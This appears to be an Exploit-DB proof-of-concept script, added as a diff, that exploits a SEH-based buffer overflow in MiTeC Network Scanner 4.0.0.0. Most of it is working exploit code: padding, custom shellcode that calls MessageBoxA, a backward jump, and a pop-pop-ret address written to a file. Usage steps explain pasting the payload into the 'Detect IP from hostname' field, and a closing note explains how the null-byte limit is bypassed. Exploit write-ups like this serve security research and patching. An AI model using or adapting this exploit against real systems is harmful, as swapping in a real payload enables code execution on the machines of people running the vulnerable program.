@@ -1,0 +1,71 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+### Network Scanner Version 4.0.0.0 - SEH Overflow Exploit by n30m1nd ### 
+
+# Date: 2016-10-21
+# Exploit Author: n30m1nd
+# Exploit Title: Network Scanner Version 4.0.0.0 SEH Based Exploit
+# Vendor Homepage: http://www.mitec.cz/
+# Software Link: https://www.exploit-db.com/apps/8a419b10772d811ce5eea44cb88ae55b-NetScan.zip
+# Version: 4.0.0.0
+# Tested on: Win7 64bit and Win10 64 bit
+
+# Credits
+# =======
+# PoC by: INSECT.B - http://binsect00.tistory.com
+# 	https://www.exploit-db.com/exploits/39447/
+# Shouts to the crew at Offensive Security for their huge efforts on making	the infosec community better
+
+# How to
+# ======
+# * Run this python script. It will generate an "exploit.txt" file.
+# * Copy the contents and, in the program, go to the "TOOLS" tab then click on "Detect IP from hostname" and paste the contents
+# * MessageBoxA is called on an infinite loop since the exception handler is triggered all the time
+
+# Exploit code
+# ============
+
+import struct
+
+# MessageBoxA in NetScan.exe => 004042F1
+mbox =	(
+		"\x25\x41\x41\x41"
+		"\x41\x25\x32\x32"
+		"\x32\x32\x50\x68"
+		"\x70\x77\x6E\x64"
+		"\x54\x5F\x50\x57"
+		"\x57\x50\x35\x8E"
+		"\x60\x60\x55\x35"
+		"\x7F\x22\x20\x55"
+		"\x50\xC3"
+		)
+# JUMP BACK to our shellcode! 
+nseh =	(
+        # xor al,51h; 	Sets the ZF = 0 (We have to be very unlucky for eax to end in 51h)
+        "\x34\x51"
+        # jne -32h; 	Jump if ZF = 0
+        "\x75\xCC"
+        )
+# pop pop ret => 00402E67
+sehh = struct.pack("<L", 0x00402e67)
+
+payl = "A" * (76-48)
+payl+= mbox
+payl+= "A"*(48-len(mbox))
+payl+= nseh + sehh
+
+with open("exploit.txt","wb") as f:
+	f.write(payl[:-1])
+print payl
+
+"""
+NOTE:
+The original author of this PoC stated that it was not possible to be 
+exploited since all addresses inside the binary contain the null byte.
+As you can see in this exploit, the null byte is added by default at
+the end because strings are null terminated when read from an input 
+box. This is why we write the payload minus 1 byte, payl[:-1], because
+we don't need to write the last null byte for the "pop pop ret" jump
+in the "sehh" variable.
+"""
